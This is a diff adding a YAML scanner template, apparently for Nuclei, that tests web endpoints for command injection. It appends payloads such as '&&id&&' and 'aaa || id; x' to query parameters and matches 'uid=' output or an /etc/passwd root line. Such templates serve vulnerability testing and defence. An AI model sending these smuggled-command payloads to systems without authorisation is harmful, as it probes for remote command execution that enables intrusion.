@@ -1,0 +1,40 @@
+id: cmd-injec
+info:
+  name: command Injection
+  author: Bright
+  severity: Critical
+  description: Command injection vulnerability
+http:
+  - method: POST
+    path:
+        - "{{BaseURL}}" 
+    payloads:
+      injection:
+      - "%26id%26"
+      - "&id&"
+      - "%26%26id%26%26"
+      - "&&id&&"
+      - "aaa%20%7C%7C%20id%3B%20x"
+      - "aaa || id; x"
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+            - "{{injection}}"
+    host-redirects: true
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "uid="
+          - "gid="
+          - "groups="
+        condition: and
+
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+# digest: 490a00463044022044f5c4ce901be80e947968eba35f25a3f9606a5cd8936480fd0cf89bde3edf4f022041fe2163a6b12dcb07d1e872f3051eb642e9b10dcf52f59d3e5a9a8107cf7434:922c64590222798bb761d5b6d8e72950
